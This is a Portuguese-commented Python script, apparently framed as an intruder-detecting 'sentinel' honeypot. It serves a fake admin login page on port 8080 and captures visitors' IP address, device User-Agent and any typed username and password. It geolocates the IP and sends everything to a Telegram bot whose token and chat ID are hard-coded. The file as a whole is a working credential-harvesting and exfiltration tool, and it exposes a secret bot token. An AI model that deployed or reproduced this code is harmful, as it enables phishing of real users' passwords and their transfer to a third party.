# -*- coding: utf-8 -*-
import socket
import os
import requests
from datetime import datetime

# --- CONFIGURAÇÕES ---
TOKEN = "8493685571:AAEYnphCmsAtGv5hCsqLl0R9FfovG7PiVhA"
CHAT_ID = "5153262817"

PAGINA_LOGIN = """
<html>
<head><title>Acesso Restrito - Admin Panel</title></head>
<body style="font-family: Arial; text-align: center; margin-top: 50px; background-color: #f4f4f4;">
    <div style="display: inline-block; padding: 20px; border: 1px solid #ccc; background: white; border-radius: 10px;">
        <h2 style="color: #d9534f;">🔒 Autenticação de Segurança</h2>
        <p>Sua tentativa de acesso foi registrada por motivos de auditoria.</p>
        <form method="POST">
            Usuário: <input type="text" name="user" style="margin-bottom: 10px;"><br>
            Senha: <input type="password" name="pass" style="margin-bottom: 10px;"><br>
            <input type="submit" value="Entrar" style="background: #d9534f; color: white; border: none; padding: 10px 20px; cursor: pointer;">
        </form>
    </div>
</body>
</html>
"""

def obter_geo_ip(ip):
    if ip == "127.0.0.1":
        return "📍 Acesso Local (Host)"
    try:
        # Consulta API de Geolocalização
        r = requests.get(f"http://ip-api.com/json/{ip}?fields=status,country,regionName,city,isp").json()
        if r['status'] == 'success':
            return f"📍 {r['city']}, {r['regionName']} - {r['country']} (Provedor: {r['isp']})"
    except:
        pass
    return "📍 Localização Indisponível"

def enviar_telegram(mensagem):
    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={CHAT_ID}&text={mensagem}"
    try:
        requests.get(url)
    except Exception as e:
        print(f"Erro ao enviar Telegram: {e}")

def iniciar_sentinela():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind(("0.0.0.0", 8080))
    server.listen(5)
    
    print("[*] SENTINELA ATIVA - Aguardando Captura de Dados...")

    while True:
        client, addr = server.accept()
        ip_intruso = addr[0]
        try:
            dados_brutos = client.recv(4096).decode(errors='ignore')
            
            # 1. Identificar Dispositivo (User-Agent)
            dispositivo = "Desconhecido"
            for linha in dados_brutos.split("\n"):
                if "User-Agent" in linha:
                    dispositivo = linha.replace("User-Agent: ", "").strip()

            # 2. Capturar Usuário e Senha (se houver POST)
            credenciais = "Nenhuma digitada (Apenas visitou a página)"
            if "POST" in dados_brutos:
                corpo = dados_brutos.split("\r\n\r\n")[-1]
                # Limpando a string para o Telegram ficar bonito
                credenciais = corpo.replace("&", " | ").replace("=", ": ")

            # 3. Obter Localização
            localizacao = obter_geo_ip(ip_intruso)
            
            # --- GERAR RELATÓRIO FINAL ---
            relatorio = (
                f"🚨 INVASOR DETECTADO! 🚨\n\n"
                f"🌐 IP: {ip_intruso}\n"
                f"{localizacao}\n\n"
                f"👤 DISPOSITIVO:\n{dispositivo[:150]}\n\n"
                f"🔑 CREDENCIAIS CAPTURADAS:\n{credenciais}\n\n"
                f"⏰ Hora: {datetime.now().strftime('%H:%M:%S')}"
            )

            print(f"\n[!] ALERTA ENVIADO: {ip_intruso}")
            enviar_telegram(relatorio)

            # Resposta para o invasor
            if "POST" in dados_brutos:
                client.send(b"HTTP/1.1 401 Unauthorized\r\n\r\nACESSO NEGADO: As credenciais nao conferem.")
            else:
                resposta = f"HTTP/1.1 200 OK\r\nContent-Type: text/html\r\n\r\n{PAGINA_LOGIN}"
                client.send(resposta.encode())

        except Exception as e:
            print(f"Erro no processamento: {e}")
        
        client.close()

if __name__ == "__main__":
    iniciar_sentinela()